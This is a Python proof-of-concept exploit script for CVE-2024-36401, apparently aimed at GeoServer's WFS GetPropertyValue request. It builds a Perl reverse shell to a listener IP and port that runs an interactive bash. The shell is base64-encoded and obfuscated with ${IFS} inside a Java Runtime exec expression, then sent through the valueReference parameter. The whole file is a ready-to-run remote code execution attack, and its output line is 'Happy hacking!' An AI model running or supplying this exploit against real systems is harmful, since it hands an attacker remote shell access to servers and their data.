#!/usr/bin/env python3
import requests
import base64
import sys
import signal
import argparse





def signal_handler(sig, frame):
    print("Exiting with status code 1")
    sys.exit(1)
signal.signal(signal.SIGINT, signal_handler)


def assign_listener(ip,port):
    command = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};" \
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){" \
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");" \
        "exec(\"/bin/bash -i\");};'"
    return command


def get_typenames():
    try:
        with open("type_names.txt", "r") as f:
            names = f.readlines()
            return [name for name in names]
    except:
        print("File with typenames was not found, make sure rev.py and type_names.txt are in the same directory")
    
def enconded_command(command):
    b64 = base64.b64encode(command.encode()).decode()
    new_command = f"sh -c echo${{IFS}}{b64}|base64${{IFS}}-d|sh"
    final_command = f"exec(java.lang.Runtime.getRuntime(),'{new_command}')"
    return final_command

def make_request(typenames, encoded_command, url):
    for typename in typenames:
        params = {
            'service': 'WFS',
            'version': '2.0.0',
            'request': 'GetPropertyValue',
            'typeNames': typename,
            'valueReference': encoded_command
        }
        headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': '*/*',
            'Accept-Language': 'en-US;q=0.9,en;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
            'Connection': 'close',
            'Cache-Control': 'max-age=0'
            }
        response = requests.get(url, params=params, headers=headers)
        if response.status_code == 400:
            print("Reverse shell sent! Happy hacking!")
            break
        

def main():
    print(
        """
        
   _______      ________    ___   ___ ___  _  _         ____    __ _  _    ___  __ 
  / ____\ \    / /  ____|  |__ \ / _ \__ \| || |       |___ \  / /| || |  / _ \/_ |
 | |     \ \  / /| |__ ______ ) | | | | ) | || |_ ______ __) |/ /_| || |_| | | || |
 | |      \ \/ / |  __|______/ /| | | |/ /|__   _|______|__ <| '_ \__   _| | | || |
 | |____   \  /  | |____    / /_| |_| / /_   | |        ___) | (_) | | | | |_| || |
  \_____|   \/   |______|  |____|\___/____|  |_|       |____/ \___/  |_|  \___/ |_|
                                                                                   
                                                                                   
PoC for the CVE-2024-36401
By y1s4s


       """
    )
    parser = argparse.ArgumentParser(
        description='CVE-2024-36401 PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('-u', '--url', type=str, required=True, help='target url')
    parser.add_argument('-i', '--ip', type=str, required=True, help='listener IP')
    parser.add_argument('-p', '--port', type=str, required=True, help='listener port')
    args = parser.parse_args()
    reverse_shell = assign_listener(args.ip, args.port)
    encoded_rev = enconded_command(reverse_shell)
    typenames = get_typenames()
    make_request(typenames, encoded_rev, args.url)

if __name__== "__main__":
    main()